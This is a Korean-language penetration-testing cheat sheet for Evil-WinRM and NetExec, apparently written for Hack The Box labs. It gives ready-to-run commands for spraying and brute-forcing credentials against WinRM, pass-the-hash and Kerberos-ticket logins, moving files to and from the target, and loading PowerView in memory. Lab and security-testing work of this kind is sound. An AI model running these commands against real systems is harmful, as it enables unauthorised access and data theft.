# Evil-WinRM

# WinRM (5985 / 5986) — Evil-WinRM

WinRM은 Windows 원격 관리 서비스다. 기본 포트는 HTTP 5985, HTTPS 5986이며 `/wsman` 엔드포인트를 사용한다. Evil-WinRM은 유효한 자격증명으로 대화형 PowerShell 세션을 여는 도구다. 비밀번호뿐 아니라 NTLM 해시, Kerberos 티켓, 클라이언트 인증서로도 접속할 수 있다.

포트가 열려 있고 비밀번호가 맞아도 해당 계정에 원격 세션 권한이 없으면 접속이 거부된다. 기본적으로 로컬 Administrators가 허용되며, 환경에 따라 Remote Management Users 같은 그룹에도 권한이 부여될 수 있다. **인증 성공과 쉘 실행 가능 여부를 따로 확인**해야 한다.

---

## 1. 열거 및 접속 가능 여부 확인

```bash
# Kali/Parrot에서 NetExec 설치 (HTB 지문의 netexec과 nxc는 같은 도구)
sudo apt install netexec
nxc -h
nxc winrm -h

# 포트 및 서비스 확인
nmap -sV -p 5985,5986 <IP>

# NetExec으로 WinRM 응답 확인
nxc winrm <IP>

# 자격증명 하나 검증
nxc winrm <IP> -u <USER> -p '<PASSWORD>'

# 도메인 명시 (SMB 445가 막혀 도메인 자동 확인이 실패할 때도 유용)
nxc winrm <IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>

# 유효한 계정으로 원격 PowerShell 명령 실행 확인
nxc winrm <IP> -u <USER> -p '<PASSWORD>' -X 'whoami'
```

`[+]`는 자격증명 인증 성공을 뜻한다. 출력에 `(Pwn3d!)`가 함께 표시되면 NetExec 기준 WinRM 명령 실행도 가능한 상태다. `Pwn3d!`가 없거나 Evil-WinRM 접속이 거부되면 계정의 원격 세션 권한을 확인한다. SMB에 로그인된다는 사실만으로 WinRM 접속 권한까지 보장되지는 않는다.

---

## 2. 사용자/비밀번호 목록 확인 (HTB 실습 흐름)

사용자 목록과 비밀번호 목록을 받았다면 NetExec으로 WinRM 인증 결과를 확인한다. 여러 값이 들어간 두 파일을 함께 넣으면 조합을 시도하므로, 계정 잠금 정책과 시도 횟수를 먼저 확인한다.

```bash
# 사용자·비밀번호 목록의 조합을 시도
nxc winrm <IP> -u users.txt -p passwords.txt

# 유효한 자격증명을 찾은 뒤에도 계속 확인
nxc winrm <IP> -u users.txt -p passwords.txt --continue-on-success

# 두 파일의 같은 줄끼리만 대응시켜 시도 (user1 ↔ pass1)
nxc winrm <IP> -u users.txt -p passwords.txt --no-bruteforce

# 단일 비밀번호를 여러 사용자에게 확인
nxc winrm <IP> -u users.txt -p '<PASSWORD>' --continue-on-success

# 요청 간 간격 조절
nxc winrm <IP> -u users.txt -p '<PASSWORD>' --jitter 2-5
```

`--no-bruteforce`는 사용자/비밀번호 파일의 **같은 줄**이 짝일 때 사용한다. 두 파일의 모든 조합이 필요한 문제에 붙이면 일부 조합을 시도하지 못한다. 결과에서 `[+]`로 표시된 사용자·비밀번호를 확인한 뒤, `(Pwn3d!)` 또는 `-X 'whoami'`로 실제 명령 실행 가능 여부까지 본다.

---

## 3. 설치 및 기본 접속

```bash
# Kali/Parrot 패키지 또는 Ruby gem으로 설치
sudo apt install evil-winrm
sudo gem install evil-winrm

# 옵션 확인
evil-winrm -h

# 비밀번호로 접속
evil-winrm -i <IP> -u <USER> -p '<PASSWORD>'

# 비밀번호를 명령줄에 남기지 않고 프롬프트에서 입력
evil-winrm -i <IP> -u <USER>

# HTTPS 리스너 (기본 5986)
evil-winrm -i <IP> -u <USER> -p '<PASSWORD>' -S

# 기본 포트가 아닐 때. -P는 포트, -S는 HTTPS
evil-winrm -i <IP> -u <USER> -p '<PASSWORD>' -P <PORT>
evil-winrm -i <IP> -u <USER> -p '<PASSWORD>' -S -P <PORT>
```

접속에 성공하면 `*Evil-WinRM* PS ...>` 프롬프트가 뜬다. 이후 `whoami`, `hostname`, `Get-ChildItem` 등 PowerShell 명령을 실행할 수 있다. HTB처럼 로그인 후 플래그 파일을 찾는 문제에서는 먼저 현재 사용자와 위치를 확인하고 해당 계정이 읽을 수 있는 디렉터리를 탐색한다.

```powershell
whoami
hostname
Get-Location
Get-ChildItem -Force
Get-ChildItem C:\Users\<USER> -Force
Get-Content <FLAG_FILE>
```

---

## 4. NTLM 해시, Kerberos 티켓, 인증서 접속

```bash
# Pass-the-Hash: -H에는 NT 해시를 입력
evil-winrm -i <IP> -u <USER> -H <NT_HASH>

# Kerberos: IP 대신 대상 호스트의 FQDN 사용
# 티켓은 ccache 또는 kirbi 파일. realm/KDC 설정과 시간 동기화 필요
evil-winrm -i <HOST_FQDN> -r <DOMAIN> -K /path/to/ticket.ccache

# 클라이언트 인증서를 사용하는 환경
evil-winrm -i <HOST_FQDN> -S -c /path/to/public.pem -k /path/to/private.pem
```

`-p`는 평문 비밀번호, `-H`는 NT 해시다. Kerberos는 호스트 이름과 realm 설정이 맞아야 하므로 IP로 접속하던 명령을 그대로 바꾸면 실패할 수 있다. `-c`/`-k`는 대상이 인증서 기반 인증을 허용할 때 사용한다.

---

## 5. 세션에서 파일 전송

```powershell
# 로컬(공격 머신) → 원격 Windows
upload /path/to/local/file.exe C:\Temp\file.exe

# 원격 Windows → 로컬(공격 머신)
download C:\Temp\result.txt /path/to/local/result.txt

# 세션 종료
exit
```

`upload`의 첫 경로는 로컬 파일, 둘째 경로는 원격 저장 위치다. `download`는 반대다. 파일 이름만 쓰면 현재 작업 디렉터리를 기준으로 처리되며, 다른 디렉터리를 지정할 때는 절대 경로를 사용한다. Windows 경로에 공백이 있으면 경로를 따옴표로 감싼다.

---

## 6. PowerShell 스크립트 로드

```bash
# -s는 로컬 PowerShell 스크립트 디렉터리
evil-winrm -i <IP> -u <USER> -p '<PASSWORD>' -s /path/to/scripts/
```

```powershell
# -s로 지정한 로컬 디렉터리의 스크립트를 메모리에 로드
PowerView.ps1

# 로드된 함수 및 사용 가능한 기능 확인
menu

# 스크립트를 원격 디스크에 올려야 할 때는 upload 사용
upload /path/to/scripts/PowerView.ps1 C:\Temp\PowerView.ps1
```

`-s`와 `upload`는 다르다. `-s`로 지정한 파일명을 세션에서 실행하면 로컬 스크립트를 읽어 메모리에 로드한다. `upload`는 원격 디스크에 파일을 쓴다. 현재 세션에서 필요한 방식에 맞춰 선택한다.

---

## 7. 접속 실패 시 확인 순서

1. `nmap -sV -p 5985,5986 <IP>`로 리스너와 포트를 확인한다. HTTPS만 열려 있으면 `-S`, 사용자 지정 포트라면 `-P <PORT>`를 지정한다.
2. `nxc winrm <IP> -u <USER> -p '<PASSWORD>'`로 자격증명 자체가 맞는지 확인한다. 도메인/로컬 계정을 혼동했는지도 본다.
3. 인증은 성공하지만 `WinRMAuthorizationError`가 나면 원격 세션 권한을 확인한다. RDP 또는 SMB 접근 권한과 WinRM 접근 권한은 별개다.
4. Kerberos 접속만 실패하면 `-i`에 FQDN을 썼는지, `-r` realm, 티켓, KDC 이름 해석, 클라이언트와 DC의 시간이 맞는지 확인한다.
5. 스크립트가 보이지 않으면 `-s`에 지정한 **로컬** 디렉터리와 파일명을 확인한다. 파일 전송 실패 시에도 로컬/원격 경로 방향부터 다시 본다.

---

## 팁

- 비밀번호에 `!`, `$` 같은 셸 특수문자가 있으면 작은따옴표로 감싼다. 명령줄에 비밀번호를 남기고 싶지 않으면 Evil-WinRM에서 `-p`를 생략하고 프롬프트에 입력한다.
- `nxc winrm -h`, `evil-winrm -h`로 설치된 버전의 옵션을 확인한다. HTB 지문의 도구 버전과 현재 설치 버전이 다를 수 있다.
- WinRM 세션은 접속한 **계정의 권한**으로 실행된다. 접속에 성공했다고 자동으로 관리자 권한이 생기지는 않는다.
